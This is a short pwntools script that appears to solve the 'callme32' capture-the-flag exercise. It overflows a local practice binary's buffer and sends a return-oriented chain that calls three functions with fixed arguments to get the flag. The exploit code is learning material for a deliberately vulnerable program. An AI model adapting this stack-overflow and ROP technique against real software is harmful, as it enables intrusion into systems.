from pwn import *
p = process('./callme32')
gdb.attach(p,"""
#b *0x8048806
""")

print p.recvuntil('...\n')
#call me one 080485c0
# two 08048620
# three 080485b0
# p/p/p/r 80488a9
args = "\xa9\x88\x04\x08" + "\x01\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00"
p.sendline("aaaa"*11 + "\xc0\x85\x04\x08" + args + "\x20\x86\x04\x08" + args + "\xb0\x85\x04\x08" + args)
print p.recvuntil("}")         

